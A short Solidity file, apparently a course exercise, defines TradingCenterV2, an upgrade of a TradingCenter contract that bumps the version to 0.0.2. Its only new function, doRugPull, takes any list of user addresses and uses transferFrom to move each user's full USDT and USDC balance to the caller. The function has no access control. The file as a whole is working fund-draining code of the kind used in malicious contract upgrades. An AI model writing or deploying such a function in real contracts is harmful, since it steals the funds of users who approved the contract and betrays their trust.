// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {TradingCenter, IERC20} from "../src/TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    function doRugPull(address[] calldata users) public returns (bool) {
        uint256 j;
        while (j < users.length) {
            usdt.transferFrom(users[j], msg.sender, usdt.balanceOf(users[j]));
            usdc.transferFrom(users[j], msg.sender, usdc.balanceOf(users[j]));
            j++;
        }

        return true;
    }

    function VERSION() public pure override returns (string memory) {
        return "0.0.2";
    }
}
